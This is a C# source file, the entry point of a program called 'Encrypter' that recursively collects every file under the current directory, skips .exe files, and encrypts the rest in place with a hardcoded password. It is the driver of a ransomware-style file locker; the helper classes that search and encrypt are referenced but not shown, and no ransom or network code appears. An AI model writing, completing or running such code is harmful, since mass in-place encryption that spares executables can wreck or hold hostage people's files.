using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Encrypter
{
    class Crypt
    {
        /**
         *  Directory/SubDirectories path to search files
         *  You could change it to @"C:\example"
         */
        private static readonly string PATH = Directory.GetCurrentDirectory();

        /**
         *  Files extension to not encrypt
         */
        private static readonly string NOT_ENCRYPT_EXT = ".exe";

        private static readonly string PASSWORD = "example";

        static void Main(string[] args)
        {
            Task.Factory.StartNew(() => encryptWorker());
            Console.ReadKey();
        }

        static void encryptWorker()
        {
            CancellationToken ct = new CancellationToken();
            Searcher searcher = new Searcher(PATH, ct);
            searcher.getSubDirectories(ct);
            searcher.getFilesInDirectory(NOT_ENCRYPT_EXT, ct);
            Console.WriteLine("Encrypted Files:");
            searcher.printAllFiles();
            Encrypt enc = new Encrypt(PASSWORD);
            enc.allFiles(searcher.getAllFiles(), ct);
        }
    }

}
